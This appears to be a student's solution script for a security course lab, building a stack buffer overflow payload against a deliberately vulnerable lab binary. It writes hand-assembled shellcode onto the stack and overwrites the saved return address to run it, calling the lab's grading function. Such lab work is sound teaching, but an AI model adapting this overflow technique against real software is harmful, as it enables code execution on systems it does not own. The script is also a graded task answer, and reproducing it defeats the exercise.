#!/usr/bin/env python3
"""Lab3 / Task 2 -- stack code execution: jump rip into machine code written on the stack.

Target: attack/dark-calc

"""
import struct
import sys

STACK_BASE = 0x721000000000            # init_fixed_stack(): mmap base
STACK_TOP = STACK_BASE + 0x801000      # fixed_stack_top (= __wrap_main rsp)
BUF = STACK_TOP - 0x30                 # input()'s expression[] buffer

# guard the layout assumptions used by the exploit
assert STACK_TOP == 0x721000801000 and BUF == 0x721000800FD0

# hand-assembled shellcode (see docstring); 15 bytes + 9 nop = 24 bytes,
# fitting into expression[16] + the 8-byte saved-rbp slot.
SHELLCODE = bytes.fromhex(
    "68" "1f1c4000"   # push 0x401c1f
    "6a04"            # push 4
    "5f"              # pop  rdi
    "b8871a4000"      # mov  eax, 0x401a87   (grade_eval)
    "ffe0"            # jmp  rax
) + b"\x90" * 9

def build_payload() -> bytes:
    shellcode = SHELLCODE
    assert len(shellcode) <= 24, "shellcode must fit below the return-address slot"
    payload = bytearray()
    payload += shellcode                             # +0x00  code executed on the stack
    payload += b"\x90" * (24 - len(shellcode))       # +..    pad to the saved-rbp slot
    payload += struct.pack("<Q", BUF)                # +0x18  saved rip -> buffer (code)
    return bytes(payload)

def main() -> None:
    payload = build_payload()
    assert b"\n" not in payload, "payload must not contain a newline"
    assert bytes.fromhex("6a045f") in payload
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()
